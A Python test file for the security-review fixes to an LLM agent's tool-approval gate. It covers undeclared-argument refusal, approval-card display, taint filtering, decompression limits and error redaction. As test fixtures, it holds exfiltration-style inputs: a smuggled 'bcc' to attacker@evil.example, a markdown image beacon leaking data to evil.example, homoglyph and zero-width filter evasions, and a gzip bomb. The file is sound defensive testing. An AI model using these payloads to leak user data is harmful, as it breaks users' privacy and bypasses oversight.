"""Stage 4 fixes: the GĐ2 security review (fix-gd2.md).

One group per finding (H1, H2, M1, M2, M4, M5, M6, L1, L2, L6). M3 and the
image rule of H2 are frontend code and are tested in vitest. Every test here
failed on the code of commit 4b8dcaf6 before the fix; PROGRESS.md says which
assertion.

The rig is the one of `test_actions_p0.py`: the real `/chat` and `/chat/resume`
routes, the real graph, the real dev reminders server on loopback, a
`LocalSealer`. No LLM call, no database.
"""

from __future__ import annotations

import asyncio
import gzip
import json
import logging

import httpx
import pytest

from langgraph_agents.loop.errors import INVALID_ARGS
from langgraph_agents.loop.gate import check
from langgraph_agents.loop.limits import Caps, new_turn
from langgraph_agents.loop.rate import MemoryRateCounter, set_store as set_rate_store
from langgraph_agents.loop.tools.registry import ToolSpec
from tests.langgraph_agents.loop.approval_harness import (
    CREATE, LIST, SESSION, USER, body_text, call, first, reply, tool_contents, types,
)
from tests.langgraph_agents.loop.test_actions_p0 import (  # noqa: F401 - fixtures
    TITLE, WHEN, reminders_server, rig,
)


# ═════════════════════════════════════════════════════════════════════════
# H1. Arguments the card does not show must not run
# ═════════════════════════════════════════════════════════════════════════


def _spec(risk="internal", props=None, required=("q",), **kw):
    return ToolSpec(
        name=kw.pop("name", "t"), description="d",
        parameters={"type": "object",
                    "properties": props if props is not None else {"q": {"type": "string"}},
                    "required": list(required)},
        risk=risk, source=kw.pop("source", "builtin"),
        call=lambda args, config: None, **kw)


def _gate(spec, args):
    set_rate_store(MemoryRateCounter())
    turn = new_turn(Caps(max_rounds=6, max_calls_per_round=2, max_calls_per_turn=4,
                         max_writes_per_round=1))
    turn.user_id = "u1"
    return asyncio.run(check({"id": "c1", "name": spec.name, "arguments": args},
                             spec, turn))


@pytest.mark.parametrize("risk", ["internal", "egress_read"])
def test_h1_an_argument_the_schema_does_not_declare_is_refused_for_every_tool(risk):
    d = _gate(_spec(risk=risk), {"q": "x", "bcc": "attacker@evil.example"})
    assert d.kind == INVALID_ARGS and d.refusal
    assert "unknown argument" in d.message and "bcc" in d.message


def test_h1_a_write_with_an_extra_key_is_refused_before_a_card_exists(rig):
    rig.model.script(
        reply("", call("c1", CREATE, title=TITLE, when=WHEN, bcc="a@evil.example")),
        reply("I could not."), reply("I could not."))
    resp, ev = rig.chat()
    assert resp.status_code == 200
    assert "approval_required" not in types(ev)
    assert rig.actions._rows == {} and rig.fake.writes == []
    told = tool_contents(rig.model.calls[1]["messages"])
    assert any("unknown argument" in c and "bcc" in c for c in told)


def test_h1_the_card_shows_every_argument_even_one_the_manifest_does_not_list():
    from langgraph_agents.loop.approval import build_display
    from langgraph_agents.loop.plugins.manifest import ToolDecl

    decl = ToolDecl(risk="write", display=["title"], idempotency_arg="rid")
    args = {"when": "tomorrow", "title": "x", "note": "hidden before", "rid": "model"}
    shown = build_display(args, decl)
    assert [d["label"] for d in shown] == ["title", "when", "note"]   # display sets the order
    assert {d["label"] for d in shown} == set(args) - {"rid"}


def test_h1_displayed_keys_are_exactly_the_keys_execute_sends(rig):
    """For a proposed action: card keys == sent keys minus the idempotency key.
    The manifest `display` list is narrowed on purpose to prove it hides nothing."""
    from langgraph_agents.loop.plugins.manifest import get_manifest

    decl = get_manifest("dev-reminders").tools["create_reminder"]
    saved = list(decl.display)
    decl.display = ["title"]               # the manifest names one of two arguments
    try:
        _, card = rig.propose()
    finally:
        decl.display = saved
    shown = {d["label"] for d in card["display"]}
    rig.model.script(reply("ok"), reply("Done."))
    assert rig.resume(card["thread_id"], card["action_id"])[0].status_code == 200
    sent = set(rig.fake.writes[0])
    assert shown == sent - {"request_id"} == {"title", "when"}


def test_h1_builtin_and_plugin_schemas_declare_every_key_the_code_sends():
    """Unknown arguments are refused for every tool, so a schema that left a key
    out would break that tool for the model. These are the keys each call reads."""
    from langgraph_agents.loop.tools import builtin

    def props(spec):
        return set(spec.parameters.get("properties", {}))

    assert props(builtin.kb_search_spec()) >= {"query"}
    assert props(builtin.kb_search_spec()) <= {"query", "top_k"}
    assert props(builtin.recall_self_spec()) == {"query"}
    assert props(builtin.youtube_transcript_spec()) == {"url"}
    assert props(builtin.load_skill_spec()) == {"name"}
    assert props(builtin.request_motion_spec()) == {"prompt"}
    assert props(builtin.web_search_spec()) == {"query", "max_results", "domain_filter"}


def test_h1_the_dev_plugin_schema_declares_what_execute_sends(rig):
    from langgraph_agents.loop.tools.registry import build_turn_tools
    # One turn so the plugin specs exist, then read the live schema.
    rig.model.script(reply("hi"), reply("hi"))
    rig.chat("hello")
    tools = {t["function"]["name"]: t["function"]["parameters"]
             for t in rig.model.calls[0]["tools"]}
    assert set(tools[CREATE]["properties"]) == {"title", "when", "request_id"}


# ═════════════════════════════════════════════════════════════════════════
# H2. The waiting line carries no argument text
# ═════════════════════════════════════════════════════════════════════════

BEACON = "![x](https://evil.example/p.png?d=secret-fact)"


def test_h2_the_waiting_line_holds_no_argument_text(rig):
    events, card = rig.propose(title=BEACON)
    line = rig.rec.answers[-1]["assistant_answer"]
    streamed = body_text(events)
    for text in (line, streamed):
        assert "evil.example" not in text and "![" not in text and "secret-fact" not in text
        assert text.startswith("Waiting for your approval:")
        assert "create_reminder" in text              # the tool's display name, nothing else
    assert line == streamed
    # The card itself still shows the value, as plain text, for the user to judge.
    assert card["display"][0]["value"] == BEACON


def test_h2_the_waiting_line_is_written_in_the_user_language_without_arguments(rig):
    rig.model.script(reply("", call("c1", CREATE, title=BEACON, when=WHEN)))
    resp, ev = rig.chat(locale="vi")
    assert resp.status_code == 200
    line = rig.rec.answers[-1]["assistant_answer"]
    assert line.startswith("Đang chờ bạn duyệt:") and "evil.example" not in line


def test_h2_pending_line_uses_only_a_clean_tool_name():
    from langgraph_agents.loop.outcome import pending_line
    assert pending_line("create_reminder", "en") == "Waiting for your approval: create_reminder"
    assert pending_line("![x](https://e.example/p)\nzzz", "en").count("e.example") == 0


# ═════════════════════════════════════════════════════════════════════════
# M1. Long values: shown in full, with a limit on the whole payload
# ═════════════════════════════════════════════════════════════════════════


def test_m1_the_card_shows_the_whole_value():
    from langgraph_agents.loop.approval import build_display
    body = "x" * 3000
    assert build_display({"body": body})[0]["value"] == body


def test_m1_a_payload_over_8000_characters_is_refused_at_the_gate(rig):
    big = "y" * 8100
    rig.model.script(reply("", call("c1", CREATE, title=big, when=WHEN)),
                     reply("Too long."), reply("Too long."))
    resp, ev = rig.chat()
    assert resp.status_code == 200
    assert "approval_required" not in types(ev)
    assert rig.actions._rows == {} and rig.fake.writes == []
    told = tool_contents(rig.model.calls[1]["messages"])
    assert any("invalid_args" in c and "payload too large for approval" in c for c in told)


def test_m1_a_payload_just_under_the_limit_gets_a_card_with_the_full_value(rig):
    ok = "z" * 7900
    _, card = rig.propose(title=ok)
    assert card["display"][0]["value"] == ok


# ═════════════════════════════════════════════════════════════════════════
# M2. Taint rule 1 survives a resume
# ═════════════════════════════════════════════════════════════════════════


def test_m2_a_personal_read_before_the_pause_still_blocks_egress_after_approval(
        rig, monkeypatch):
    from langgraph_agents.loop.plugins.manifest import get_manifest

    monkeypatch.setattr(get_manifest("dev-reminders"), "data_class", "personal")
    rig.model.script(reply("", call("r1", LIST)),
                     reply("", call("c1", CREATE, title=TITLE, when=WHEN)))
    resp, ev = rig.chat()
    card = first(ev, "approval_required")
    assert card is not None, types(ev)
    # The resumed turn tries another egress read with what it read.
    rig.model.script(reply("", call("r2", LIST)), reply("ok"), reply("ok"))
    resp, ev = rig.resume(card["thread_id"], card["action_id"])
    assert resp.status_code == 200
    told = tool_contents(rig.model.calls[-2]["messages"])
    assert any("approval_unavailable" in c and "rule 1" in c for c in told)
    assert rig.fake.reads == 1                   # only the read before the pause ran


# ═════════════════════════════════════════════════════════════════════════
# M4. Taint rule 2 normalises both sides
# ═════════════════════════════════════════════════════════════════════════


def _banned(fact, args, message=""):
    from langgraph_agents.loop.taint import build_taint, find_banned
    return find_banned(args, build_taint([fact], [], message))


def test_m4_a_zero_width_split_is_caught():
    assert "osteoarthritis" in _banned("User has knee osteoarthritis.",
                                       "oste​oarthritis help")
    assert "knee" in _banned("User has knee osteoarthritis.", "k­nee help")


def test_m4_a_cyrillic_lookalike_in_the_name_is_caught():
    assert "lan" in _banned("the user's name is Lan", "show Lаn's records")


def test_m4_vietnamese_with_and_without_diacritics_match():
    assert "viêm khớp gối" in _banned("viêm khớp gối", "viem khop goi") or \
        "viem khop goi" in _banned("viêm khớp gối", "viem khop goi")
    assert _banned("viem khop goi", "viêm khớp gối")


def test_m4_a_hyphenated_or_dotted_term_is_caught():
    assert "osteoarthritis" in _banned("knee osteoarthritis", "knee-osteoarthritis plan")
    assert "osteoarthritis" in _banned("knee osteoarthritis", "knee_osteoarthritis")
    assert "osteoarthritis" in _banned("knee osteoarthritis", "knee/osteoarthritis")
    assert "osteoarthritis" in _banned("knee osteoarthritis", "knee.osteoarthritis")


def test_m4_what_the_user_typed_is_allowed_after_the_same_normalisation():
    # The user typed "knee" with a zero-width space and a Cyrillic letter; it is
    # still their own word, so it is not banned.
    from langgraph_agents.loop.taint import build_taint, find_banned
    snap = build_taint(["knee osteoarthritis"], [], "my knеe hurts")
    assert "knee" not in snap.banned_terms
    found = find_banned("knee exercise", snap)
    assert "knee" not in found
    snap2 = build_taint(["user lives in Hanoi"], [], "I live in Hà Nội")
    assert find_banned("weather in Ha Noi", snap2) == []


# ═════════════════════════════════════════════════════════════════════════
# M5. The size cap counts decoded bytes
# ═════════════════════════════════════════════════════════════════════════


async def test_m5_a_gzip_bomb_is_refused_without_a_large_allocation():
    from langgraph_agents.loop.http import AddressPolicy, EgressBlocked, ResponseTooLarge, client_factory

    bomb = gzip.compress(b"\0" * 20_000_000)     # about 20 KB on the wire
    assert len(bomb) < 100_000
    seen = []

    def handler(request):
        seen.append(request.headers.get("accept-encoding"))
        return httpx.Response(200, headers={"content-encoding": "gzip"}, content=bomb)

    client = client_factory(("mcp.example.com",), AddressPolicy.for_tests({}),
                            httpx.MockTransport(handler), max_bytes=1_000_000)
    async with client:
        with pytest.raises((ResponseTooLarge, EgressBlocked)):
            await client.get("https://mcp.example.com/x")
    assert seen == ["identity"]                   # ECA asks for no compression


async def test_m5_a_body_over_the_cap_is_still_cut_off_with_identity_encoding():
    from langgraph_agents.loop.http import AddressPolicy, ResponseTooLarge, client_factory

    client = client_factory(
        ("mcp.example.com",), AddressPolicy.for_tests({}),
        httpx.MockTransport(lambda r: httpx.Response(200, content=b"x" * 5000)),
        max_bytes=1000)
    async with client:
        with pytest.raises(ResponseTooLarge):
            await client.get("https://mcp.example.com/x")


# ═════════════════════════════════════════════════════════════════════════
# M6. A write's status comes from the call, not from its text
# ═════════════════════════════════════════════════════════════════════════


def _approve(rig, **propose_kw):
    _, card = rig.propose(**propose_kw)
    rig.model.script(reply("ok"), reply("Done."))
    resp, ev = rig.resume(card["thread_id"], card["action_id"])
    assert resp.status_code == 200
    return card, ev


def test_m6_a_result_that_contains_the_word_error_is_still_succeeded(rig):
    card, _ = _approve(rig, title='fix the "error" screen')
    assert len(rig.fake.writes) == 1
    assert rig.status(card["action_id"]) == "succeeded"


def test_m6_a_guardrail_block_of_the_result_text_does_not_fail_the_write(rig, monkeypatch):
    from langgraph_agents.loop import errors

    class _Block:
        action = "block"
        message = "withheld"
        text = None

    async def block(ctx):
        return _Block()

    monkeypatch.setattr(errors, "run_tool_result", block)
    card, ev = _approve(rig)
    assert len(rig.fake.writes) == 1
    assert rig.status(card["action_id"]) == "succeeded"
    told = tool_contents(rig.model.calls[-2]["messages"])
    assert any("succeeded" in c or "ran" in c for c in told)
    assert "[done]" in body_text(ev) or "[xong]" in body_text(ev)


def test_m6_a_server_that_says_isError_fails_the_write(rig):
    rig.fake.mode = "tool_error"
    card, _ = _approve(rig)
    assert rig.fake.writes == []
    assert rig.status(card["action_id"]) == "failed"


def test_m6_a_transport_error_after_the_request_is_unknown_not_failed(rig, monkeypatch):
    from langgraph_agents.loop.mcp_client import McpClient

    async def drop(self, *a, **k):
        raise httpx.ReadError("connection dropped")

    _, card = rig.propose()
    monkeypatch.setattr(McpClient, "call_tool", drop)
    rig.model.script(reply("unclear"), reply("unclear"))
    resp, ev = rig.resume(card["thread_id"], card["action_id"])
    assert resp.status_code == 200
    assert rig.status(card["action_id"]) == "unknown"


# ═════════════════════════════════════════════════════════════════════════
# L1. The gate comment says what the code does
# ═════════════════════════════════════════════════════════════════════════


def test_l1_gate_comment_names_egress_and_clinical_not_writes():
    from pathlib import Path
    import langgraph_agents.loop.gate as gate
    text = Path(gate.__file__).read_text(encoding="utf-8")
    assert "any egress or write call" not in text


# ═════════════════════════════════════════════════════════════════════════
# L2. A failing cancel check fails closed
# ═════════════════════════════════════════════════════════════════════════


def test_l2_a_cancel_check_that_raises_stops_the_write(rig, monkeypatch):
    import langgraph_agents.api.main as api_main

    _, card = rig.propose()

    async def broken(cfg, store=None):
        raise RuntimeError("store outage")

    monkeypatch.setattr(api_main, "_cancel_checker", broken)
    rig.model.script(reply("Stopped."), reply("Stopped."))
    resp, ev = rig.resume(card["thread_id"], card["action_id"])
    assert resp.status_code == 200
    assert rig.fake.writes == []
    assert rig.status(card["action_id"]) == "invalidated"


# ═════════════════════════════════════════════════════════════════════════
# L6. Errors carry a code, never str(exc)
# ═════════════════════════════════════════════════════════════════════════

SECRET = "SECRET-PROMPT-FRAGMENT"


def test_l6_cancel_route_500_carries_no_exception_text(rig, monkeypatch):
    import langgraph_agents.api.routes_loop as routes

    async def boom(*a, **k):
        raise RuntimeError(SECRET)

    monkeypatch.setattr(routes, "request_cancel", boom)
    resp = rig.client.post("/chat/cancel", json={"session_id": SESSION, "request_id": "r1"})
    assert resp.status_code == 500
    assert SECRET not in resp.text


def _agent_run(model):
    from langgraph_agents.loop.agent import agent_node
    turn = new_turn()
    config = {"configurable": {"turn_ctx": turn, "agent_model": model, "user_id": "u1",
                               "session_id": "s1", "query": "hi", "locale": "en",
                               "request_id": "r1", "persona_id": "anne",
                               "turn_tools": []}}
    return asyncio.run(agent_node({"transcript": [], "errors": [], "total_tokens": 0,
                                   "rounds": 0}, config))


class _Raises:
    def __init__(self, exc):
        self._exc = exc

    async def complete(self, *a, **k):
        raise self._exc


@pytest.mark.parametrize("make", [lambda: RuntimeError(SECRET),
                                  lambda: __import__(
                                      "langgraph_agents.loop.client",
                                      fromlist=["ModelToolCallInvalid"]
                                  ).ModelToolCallInvalid(SECRET)])
def test_l6_agent_errors_and_logs_carry_the_class_name_only(make, caplog):
    with caplog.at_level(logging.DEBUG):
        out = _agent_run(_Raises(make()))
    assert SECRET not in json.dumps(out, default=str)
    for rec in caplog.records:
        assert SECRET not in rec.getMessage()
        assert SECRET not in json.dumps(rec.__dict__, default=str)
    assert out["errors"] and out["errors"][0]["message"]
